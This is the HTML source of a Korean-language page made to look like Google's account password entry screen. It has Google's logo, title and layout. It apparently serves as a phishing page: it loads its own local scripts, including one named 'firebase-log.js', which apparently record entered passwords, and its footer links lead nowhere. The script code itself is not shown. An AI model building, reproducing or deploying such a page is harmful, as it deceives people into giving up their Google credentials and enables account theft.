<!DOCTYPE html>
<html lang="ko" dir="ltr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>비밀번호 입력 - Google 계정</title>

  <!-- 글꼴: Noto Sans KR (src) -->
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link
    href="https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@400;500;700&display=swap"
    rel="stylesheet"
  />

  <link rel="stylesheet" href="css/login.css" />

  <!-- Google tag (gtag.js) -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=G-BXBVJ894SD"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'G-BXBVJ894SD');
  </script>
</head>
<body>
  <main class="page">
    <div class="card" role="dialog" aria-labelledby="pw-title">
      <!-- 상단 로딩바 -->
      <div class="progress" id="progress" role="progressbar" aria-label="로드 중" aria-hidden="true">
        <div class="progress__buffer"></div>
        <div class="progress__bar progress__bar--primary"><span class="progress__inner"></span></div>
        <div class="progress__bar progress__bar--secondary"><span class="progress__inner"></span></div>
      </div>

      <!-- 좌측: 제목 + 계정 칩 -->
      <section class="card__left">
        <img
          class="logo"
          src="assets/googleg_gradient_standard_48px.svg"
          alt="Google"
        />
        <h1 class="card__title" id="pw-title">시작하기</h1>

        <!-- 이메일부(계정 칩) — 드롭다운 클릭 시 이메일 입력 화면으로 복귀 -->
        <button type="button" class="chip" id="account-chip">
          <span class="chip__avatar" aria-hidden="true">
            <svg viewBox="0 0 24 24">
              <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z" />
            </svg>
          </span>
          <span class="chip__email" id="chip-email">이메일</span>
          <svg class="chip__caret" viewBox="0 0 24 24" aria-hidden="true">
            <path d="M7 10l5 5 5-5z" />
          </svg>
        </button>
      </section>

      <!-- 우측: 비밀번호 폼 -->
      <section class="card__right">
        <form id="password-form" novalidate>
          <div class="field">
            <input
              type="password"
              id="password"
              class="field__input"
              placeholder=" "
              autocomplete="current-password"
              autofocus
            />
            <label class="field__label" for="password">비밀번호 입력</label>
          </div>

          <label class="checkbox">
            <input type="checkbox" id="show-password" />
            <span class="checkbox__box" aria-hidden="true">
              <svg viewBox="0 0 24 24">
                <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z" />
              </svg>
            </span>
            <span>비밀번호 표시</span>
          </label>

          <div class="actions">
            <button type="button" class="btn-text">비밀번호를 잊으셨나요?</button>
            <button type="submit" class="btn-primary">다음</button>
          </div>
        </form>
      </section>
    </div>
  </main>

  <!-- 하단 -->
  <footer class="footer">
    <div class="lang" role="button" tabindex="0">
      <span>한국어</span>
      <svg class="lang__caret" viewBox="0 0 24 24" aria-hidden="true">
        <path d="M7 10l5 5 5-5z" />
      </svg>
    </div>
    <nav class="footer__links">
      <a href="#">도움말</a>
      <a href="#">개인정보처리방침</a>
      <a href="#">약관</a>
    </nav>
  </footer>

  <script type="module" src="js/firebase-log.js"></script>
  <script src="js/auth.js"></script>
  <script>
    initPasswordScreen();
  </script>
</body>
</html>
